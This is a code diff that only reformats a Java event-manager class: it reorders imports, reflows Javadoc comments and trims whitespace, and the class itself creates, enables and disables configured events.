@@ -7,29 +7,33 @@
 
 package com.android.syssetup.manager;
 
-import java.util.HashMap;
-import java.util.Iterator;
-import java.util.Map;
-
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfEvent;
 import com.android.syssetup.event.BaseEvent;
 import com.android.syssetup.event.FactoryEvent;
 import com.android.syssetup.util.Check;
 
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Map;
+
 /**
  * The Class EventManager.
  */
 public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ManagerEvent"; //$NON-NLS-1$
 
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static ManagerEvent singleton;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the event manager
 	 */
 	public static ManagerEvent self() {
@@ -48,9 +52,8 @@ public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
 	/**
 	 * mapAgent() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
-	 * 
-	 * @param key
-	 *            : Agent ID
+	 *
+	 * @param key : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
 	private BaseEvent createEvent(final String type, final ConfEvent conf) {
@@ -64,7 +67,7 @@ public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
 
 		String ts = conf.getSafeString("ts");
 		String te = conf.getSafeString("te");
-		
+
 		if (subtype == "" && "00:00:00".equals(ts) && "23:59:59".equals(te)) {
 			// TODO messages
 			subtype = "loop";
@@ -72,7 +75,7 @@ public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
 
 		if (instances.containsKey(conf.getId()) == true) {
 			event = instances.get(conf.getId());
-			
+
 			if (!subtype.equals(event.getSubType())) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (createEvent): same id, but different subtype");
@@ -94,7 +97,7 @@ public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
 
 	/**
 	 * Start events.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	@Override
@@ -247,22 +250,22 @@ public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
 	public void enable(int eventId) {
 		HashMap<Integer, ConfEvent> events = status.getEventsMap();
 		ConfEvent event = events.get(eventId);
-		
+
 		if (event == null) {
 			return;
 		}
-		
+
 		event.enabled = true;
 	}
-	
+
 	public void disable(int eventId) {
 		HashMap<Integer, ConfEvent> events = status.getEventsMap();
 		ConfEvent event = events.get(eventId);
-		
+
 		if (event == null) {
 			return;
 		}
-		
+
 		event.enabled = false;
 	}
 }
